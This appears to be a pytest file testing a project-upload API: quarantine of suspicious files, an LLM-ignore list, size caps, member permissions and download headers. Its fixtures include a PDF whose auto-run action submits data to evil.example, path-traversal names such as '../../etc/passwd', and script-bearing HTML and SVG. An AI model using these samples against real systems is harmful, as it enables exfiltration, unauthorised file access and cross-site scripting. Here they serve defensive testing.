"""Putting a file into a project through the app, and what happens to it."""

from __future__ import annotations

import json
import subprocess

import pytest

BENIGN = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)
PHONES_HOME = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction"
    b"<</S/SubmitForm/F(https://evil.example/x)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)


@pytest.fixture(autouse=True)
def _no_scanner(monkeypatch):
    monkeypatch.delenv("BLPL_CLAMD_SOCKET", raising=False)
    monkeypatch.delenv("BLPL_CLAMD_HOST", raising=False)
    monkeypatch.delenv("BLPL_QUARANTINE_REQUIRE_SCAN", raising=False)


def _upload(client, items, project="mine"):
    files = [("files", (name, data, "application/octet-stream")) for name, data, _ in items]
    meta = json.dumps([m for _, _, m in items])
    return client.post(f"/api/projects/{project}/uploads", files=files, data={"meta": meta})


def _git(cwd, *args):
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True).stdout


def test_each_file_gets_its_own_verdict_and_lands_by_kind(unlocked):
    import app.main as main

    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = _upload(unlocked, [
        ("ds.pdf", BENIGN, {"kind": "datasheet", "mpn": "TPS62840"}),
        ("guide.pdf", BENIGN + b"%guide\n", {"kind": "reference"}),
        ("evil.pdf", PHONES_HOME, {"kind": "reference"}),
        ("enclosure.step", b"ISO-10303-21;\n", {"kind": "reference"}),
    ])
    assert r.status_code == 200, r.text
    by = {x["name"]: x for x in r.json()["results"]}
    assert by["ds.pdf"]["path"] == "datasheets/TPS62840.pdf"
    assert by["guide.pdf"]["path"] == "references/guide.pdf"
    assert by["evil.pdf"]["state"] == "held" and by["evil.pdf"]["path"] is None
    assert by["evil.pdf"]["reasons"]
    assert by["enclosure.step"]["inspection"] == "not_inspected"

    proj = main.PROJECTS_ROOT / "mine"
    tracked = _git(proj, "ls-files")
    assert "references/guide.pdf" in tracked and "retrieved/quarantine.json" in tracked
    # A held file stays as evidence but never enters history.
    assert not any(line.startswith("retrieved/") and line.endswith(".pdf") for line in tracked.splitlines())


def test_llm_ignore_at_upload_puts_the_file_on_the_list_and_the_tree_says_so(unlocked):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = _upload(unlocked, [("drawing.pdf", BENIGN, {"kind": "reference", "llm_ignore": True})])
    assert r.json()["results"][0]["llm_ignore"] is True

    listed = unlocked.get("/api/projects/mine/llm-ignore").json()["files"]
    assert [f["path"] for f in listed] == ["references/drawing.pdf"]
    node = next(n for n in unlocked.get("/api/projects/mine/tree").json()["nodes"] if n["path"] == "references/drawing.pdf")
    assert node["llm_ignore"] is True and node["role"] == "reference"


def test_the_ignore_list_can_be_changed_after_upload(unlocked):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    _upload(unlocked, [("drawing.pdf", BENIGN, {"kind": "reference"})])

    r = unlocked.put("/api/projects/mine/llm-ignore", json={"path": "references/drawing.pdf", "ignored": True})
    assert r.json()["changed"] is True
    r = unlocked.put("/api/projects/mine/llm-ignore", json={"path": "references/drawing.pdf", "ignored": False})
    assert r.json()["changed"] is True
    assert unlocked.get("/api/projects/mine/llm-ignore").json()["files"] == []


def test_the_ignore_list_refuses_a_path_outside_the_project(unlocked):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = unlocked.put("/api/projects/mine/llm-ignore", json={"path": "../../etc/passwd", "ignored": True})
    assert r.status_code in (400, 404)


def test_the_ledger_records_who_uploaded_what(unlocked):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    _upload(unlocked, [("evil.pdf", PHONES_HOME, {"kind": "reference"})])
    q = unlocked.get("/api/projects/mine/quarantine").json()
    assert q["summary"]["held"] == 1
    entry = q["entries"][0]
    assert entry["origin"] == "upload" and entry["uploaded_by"] == "test@example.com"
    assert entry["original_name"] == "evil.pdf"


def test_a_file_over_the_cap_is_rejected_and_the_rest_still_land(unlocked, monkeypatch):
    import app.main as main

    monkeypatch.setattr(main, "UPLOAD_MAX_BYTES", 64)
    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = _upload(unlocked, [
        ("big.bin", b"x" * 65, {"kind": "reference"}),
        ("small.txt", b"ok\n", {"kind": "reference"}),
    ])
    by = {x["name"]: x for x in r.json()["results"]}
    assert by["big.bin"]["state"] == "rejected"
    assert by["small.txt"]["path"] == "references/small.txt"


def test_a_request_without_a_kind_per_file_is_refused(unlocked):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = unlocked.post(
        "/api/projects/mine/uploads",
        files=[("files", ("a.txt", b"a", "text/plain"))],
        data={"meta": json.dumps([{"kind": "junk"}])},
    )
    assert r.status_code == 400
    r = unlocked.post(
        "/api/projects/mine/uploads",
        files=[("files", ("a.txt", b"a", "text/plain"))],
        data={"meta": "[]"},
    )
    assert r.status_code == 400


def test_a_members_upload_lands_and_is_committed_in_their_own_worktree(unlocked, second_user):
    import app.main as main
    from app import worktrees

    unlocked.post("/api/projects/init", json={"name": "mine"})
    unlocked.post("/api/projects/mine/members", json={"email": "other@example.com"})
    inv = second_user.get("/api/invitations").json()[0]["id"]
    second_user.post(f"/api/invitations/{inv}/accept")

    r = _upload(second_user, [("notes.txt", b"n\n", {"kind": "reference"})])
    assert r.json()["committed"] is True
    theirs = main.PROJECTS_ROOT / worktrees.WORKTREES_DIR / "mine" / "u2"
    assert (theirs / "references" / "notes.txt").is_file()
    assert _git(theirs, "status", "--porcelain").strip() == ""
    assert not (main.PROJECTS_ROOT / "mine" / "references").exists()


def test_a_non_member_cannot_upload(unlocked, second_user):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = _upload(second_user, [("a.txt", b"a", {"kind": "reference"})])
    assert r.status_code == 404


def test_an_uploaded_filename_cannot_escape_or_hide(unlocked):
    import app.main as main

    unlocked.post("/api/projects/init", json={"name": "mine"})
    r = _upload(unlocked, [
        ("../../../escape.md", b"a\n", {"kind": "reference"}),
        (".hidden.md", b"b\n", {"kind": "reference"}),
    ])
    paths = [x["path"] for x in r.json()["results"]]
    assert paths == ["references/escape.md", "references/hidden.md"]
    assert not (main.PROJECTS_ROOT / "escape.md").exists()


@pytest.mark.parametrize("name,data", [
    ("page.html", b"<script>fetch('/api/projects')</script>"),
    ("logo.svg", b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"),
    ("thing.xml", b"<x/>"),
    ("tool.bin", b"\x00\x01"),
])
def test_an_uploaded_active_file_is_served_as_an_opaque_download(unlocked, name, data):
    """Inline on this origin, an uploaded HTML or SVG would run with the viewer's session."""
    unlocked.post("/api/projects/init", json={"name": "mine"})
    path = _upload(unlocked, [(name, data, {"kind": "reference"})]).json()["results"][0]["path"]
    r = unlocked.get("/api/projects/mine/blob", params={"path": path})
    assert r.status_code == 200
    assert r.headers["content-type"] == "application/octet-stream"
    assert r.headers["content-disposition"].startswith("attachment")
    assert r.headers["x-content-type-options"] == "nosniff"


def test_passive_files_still_display_inline(unlocked):
    unlocked.post("/api/projects/init", json={"name": "mine"})
    results = _upload(unlocked, [
        ("guide.pdf", BENIGN, {"kind": "reference"}),
        ("notes.md", b"# hi\n", {"kind": "reference"}),
    ]).json()["results"]
    pdf = unlocked.get("/api/projects/mine/blob", params={"path": results[0]["path"]})
    assert pdf.headers["content-type"] == "application/pdf"
    assert pdf.headers["content-disposition"].startswith("inline")
    md = unlocked.get("/api/projects/mine/blob", params={"path": results[1]["path"]})
    assert md.headers["content-type"].startswith("text/plain")
    assert md.text == "# hi\n"
    assert md.headers["x-content-type-options"] == "nosniff"
